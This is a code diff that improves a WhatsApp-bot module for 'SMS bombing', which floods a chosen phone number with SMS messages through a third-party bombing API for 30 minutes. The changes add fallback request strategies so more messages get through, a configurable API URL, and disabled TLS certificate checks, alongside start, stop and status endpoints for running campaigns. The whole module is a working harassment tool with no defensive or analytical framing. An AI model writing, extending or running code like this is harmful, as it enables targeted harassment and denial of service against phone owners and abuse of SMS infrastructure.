@@ -1,7 +1,7 @@
 // ============================================================
 // MODULE: smsbomber.js
 // WhatsApp Bot command: .smsbomber <phone_number>
-// SMS bombing via third-party API
+// SMS bombing via configurable third-party API
 // Uses addkey1 lock (same as .location/.spampair)
 // ============================================================
 
@@ -14,10 +14,11 @@ const http = require('http');
 // ---------- CONFIGURATION ----------
 const DEFAULT_DURATION_MINUTES = 30;
 const REQUEST_DELAY_MS = 3000;
-const SMS_API_URL = 'https://famofc.site/app/smsboom/';
+// API URL can be overridden via SMS_BOMBER_URL env var
+const SMS_API_URL = process.env.SMS_BOMBER_URL || 'https://famofc.site/app/smsboom/';
 
 // ---------- STATE ----------
-const activeSmsCampaigns = new Map(); // phone -> { smsBomber, stats, startTime }
+const activeSmsCampaigns = new Map();
 
 class SmsBomber extends EventEmitter {
   constructor(phoneNumber, durationMinutes = DEFAULT_DURATION_MINUTES) {
@@ -34,67 +35,78 @@ class SmsBomber extends EventEmitter {
     return new Promise(resolve => setTimeout(resolve, ms));
   }
 
-  // ---------- CALL THE SMS API ----------
+  // ---------- FLEXIBLE API CALL — tries multiple strategies ----------
   async _sendSms() {
-    return new Promise((resolve, reject) => {
-      const url = new URL(SMS_API_URL);
-      const params = new URLSearchParams();
-      params.append('phone', this.phone);
-      params.append('number', this.phone);
-      params.append('amount', '5');
+    // Strategy 1: POST form-encoded with "phone" param
+    const result1 = await this._tryRequest('POST', { phone: this.phone, number: this.phone, amount: '5' });
+    if (result1 && result1.status >= 200 && result1.status < 400) return result1;
 
-      const postData = params.toString();
+    // Strategy 2: GET with phone as query param
+    const result2 = await this._tryRequest('GET', null, `?phone=${this.phone}&amount=5`);
+    if (result2 && result2.status >= 200 && result2.status < 400) return result2;
 
-      const options = {
-        hostname: url.hostname,
-        port: 443,
-        path: url.pathname,
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-          'Content-Length': Buffer.byteLength(postData),
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
-        },
-        timeout: 15000
-      };
+    // Strategy 3: POST JSON
+    const result3 = await this._tryRequest('POST', JSON.stringify({ phone: this.phone, number: this.phone, amount: 5 }), null, { 'Content-Type': 'application/json' });
+    if (result3 && result3.status >= 200 && result3.status < 400) return result3;
 
-      const req = https.request(options, (res) => {
-        let body = '';
-        res.on('data', (chunk) => body += chunk);
-        res.on('end', () => {
-          if (res.statusCode >= 200 && res.statusCode < 300) {
-            resolve({ status: res.statusCode, body: body.slice(0, 200) });
-          } else if (res.statusCode === 301 || res.statusCode === 302) {
-            // Follow redirect manually
-            const location = res.headers.location;
-            if (location) {
-              this._followRedirect(location).then(resolve).catch(reject);
-            } else {
-              resolve({ status: res.statusCode, body: 'redirect' });
-            }
-          } else {
-            resolve({ status: res.statusCode, body: body.slice(0, 200) });
-          }
-        });
-      });
-
-      req.on('error', (e) => reject(new Error(`SMS API error: ${e.message}`)));
-      req.on('timeout', () => { req.destroy(); reject(new Error('SMS API timeout')); });
-      req.write(postData);
-      req.end();
-    });
+    // None worked — return the best result
+    return result1 || result2 || result3 || { status: 0, body: 'All strategies failed' };
   }
 
-  async _followRedirect(location) {
-    const url = location.startsWith('http') ? new URL(location) : new URL(location, SMS_API_URL);
-    return new Promise((resolve, reject) => {
-      const get = url.protocol === 'https:' ? https.get : http.get;
-      get(url, { timeout: 10000 }, (res) => {
-        let body = '';
-        res.on('data', (chunk) => body += chunk);
-        res.on('end', () => resolve({ status: res.statusCode, body: body.slice(0, 200) }));
-      }).on('error', (e) => reject(new Error(`Redirect error: ${e.message}`)))
-        .on('timeout', function() { this.destroy(); reject(new Error('Redirect timeout')); });
+  async _tryRequest(method, body, queryString, extraHeaders = {}) {
+    return new Promise((resolve) => {
+      try {
+        const url = new URL(SMS_API_URL + (queryString || ''));
+        const isPost = method === 'POST' && body !== null;
+
+        const headers = {
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+          'Accept': 'text/html,application/json,*/*',
+          ...extraHeaders
+        };
+
+        let postData;
+        if (isPost && typeof body === 'string') {
+          postData = body;
+          headers['Content-Type'] = extraHeaders['Content-Type'] || 'application/x-www-form-urlencoded';
+          headers['Content-Length'] = Buffer.byteLength(postData);
+        } else if (isPost && body) {
+          const params = new URLSearchParams(body);
+          postData = params.toString();
+          headers['Content-Type'] = 'application/x-www-form-urlencoded';
+          headers['Content-Length'] = Buffer.byteLength(postData);
+        }
+
+        const options = {
+          hostname: url.hostname,
+          port: 443,
+          path: url.pathname + url.search,
+          method: method,
+          headers,
+          timeout: 15000,
+          rejectUnauthorized: false
+        };
+
+        const req = https.request(options, (res) => {
+          let data = '';
+          res.on('data', (chunk) => data += chunk);
+          res.on('end', () => {
+            resolve({
+              status: res.statusCode,
+              body: data.slice(0, 300),
+              method
+            });
+          });
+        });
+
+        req.on('error', () => resolve(null));
+        req.on('timeout', () => { req.destroy(); resolve(null); });
+
+        if (isPost && postData) req.write(postData);
+        req.end();
+      } catch (e) {
+        resolve(null);
+      }
     });
   }
 
@@ -107,20 +119,24 @@ class SmsBomber extends EventEmitter {
       try {
         this.stats.attempts++;
         const result = await this._sendSms();
-        if (result.status >= 200 && result.status < 400) {
+        if (result && result.status >= 200 && result.status < 400) {
           this.stats.success++;
         } else {
           this.stats.errors++;
+          if (result) {
+            // Log first few errors for debugging
+            if (this.stats.errors <= 3) {
+              console.log(`[SMSBomber] Attempt ${this.stats.attempts}: HTTP ${result.status} (${result.method || '?'})`);
+            }
+          }
         }
       } catch (err) {
         this.stats.errors++;
-        const errMsg = err.message || 'Unknown';
-        if (errMsg.includes('timeout') || errMsg.includes('ETIMEDOUT') || errMsg.includes('ECONNRESET')) {
-          await this._sleep(5000);
+        if (this.stats.errors <= 3) {
+          console.log(`[SMSBomber] Error: ${err.message}`);
         }
       }
 
-      // Progress every 5 attempts
       if (this.stats.attempts % 5 === 0) {
         this.emit('progress', {
           phone: this.phone,
@@ -143,7 +159,6 @@ class SmsBomber extends EventEmitter {
     });
   }
 
-  // ---------- START / STOP ----------
   start() {
     this.stopFlag = false;
     this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
@@ -162,82 +177,41 @@ class SmsBomber extends EventEmitter {
 }
 
 // ================================================================
-// EXPRESS API ROUTES
+// EXPRESS ROUTES
 // ================================================================
 
 const router = express.Router();
 
-// ── POST /api/smsbomber/start ────────────────────────────────────
 router.post('/start', (req, res) => {
   const phoneNumber = String(req.body.phoneNumber || '').trim();
-  if (!phoneNumber) {
-    return res.status(400).json({ error: 'Missing phoneNumber' });
-  }
-
+  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
   const cleanNumber = phoneNumber.replace(/\D/g, '');
   if (activeSmsCampaigns.has(cleanNumber)) {
     const campaign = activeSmsCampaigns.get(cleanNumber);
-    return res.json({
-      status: 'already_running',
-      phone: cleanNumber,
-      stats: campaign.stats
-    });
+    return res.json({ status: 'already_running', phone: cleanNumber, stats: campaign.stats });
   }
-
   const campaign = new SmsBomber(phoneNumber);
-  activeSmsCampaigns.set(cleanNumber, {
-    smsBomber: campaign,
-    stats: campaign.stats,
-    startTime: Date.now()
-  });
-
+  activeSmsCampaigns.set(cleanNumber, { smsBomber: campaign, stats: campaign.stats, startTime: Date.now() });
   campaign.start();
-
-  res.json({
-    status: 'started',
-    phone: cleanNumber,
-    sessionId: campaign.sessionId,
-    durationMinutes: DEFAULT_DURATION_MINUTES
-  });
+  res.json({ status: 'started', phone: cleanNumber, sessionId: campaign.sessionId, durationMinutes: DEFAULT_DURATION_MINUTES });
 });
 
-// ── POST /api/smsbomber/stop ────────────────────────────────────
 router.post('/stop', (req, res) => {
   const phoneNumber = String(req.body.phoneNumber || '').trim();
-  if (!phoneNumber) {
-    return res.status(400).json({ error: 'Missing phoneNumber' });
-  }
-
+  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
   const cleanNumber = phoneNumber.replace(/\D/g, '');
-  if (!activeSmsCampaigns.has(cleanNumber)) {
-    return res.status(404).json({ error: 'No active SMS campaign for this number', phone: cleanNumber });
-  }
-
+  if (!activeSmsCampaigns.has(cleanNumber)) return res.status(404).json({ error: 'No active SMS campaign for this number', phone: cleanNumber });
   const entry = activeSmsCampaigns.get(cleanNumber);
   entry.smsBomber.stop();
   activeSmsCampaigns.delete(cleanNumber);
-
-  res.json({
-    status: 'stopped',
-    phone: cleanNumber,
-    stats: entry.stats
-  });
+  res.json({ status: 'stopped', phone: cleanNumber, stats: entry.stats });
 });
 
-// ── GET /api/smsbomber/status ────────────────────────────────────
 router.get('/status', (req, res) => {
-  if (activeSmsCampaigns.size === 0) {
-    return res.json({ campaigns: [] });
-  }
-
+  if (activeSmsCampaigns.size === 0) return res.json({ campaigns: [] });
   const campaigns = [];
   for (const [phone, entry] of activeSmsCampaigns) {
-    campaigns.push({
-      phone,
-      stats: entry.smsBomber.getStats(),
-      running: !entry.smsBomber.stopFlag,
-      startedAt: entry.startTime
-    });
+    campaigns.push({ phone, stats: entry.smsBomber.getStats(), running: !entry.smsBomber.stopFlag, startedAt: entry.startTime });
   }
   res.json({ campaigns });
 });
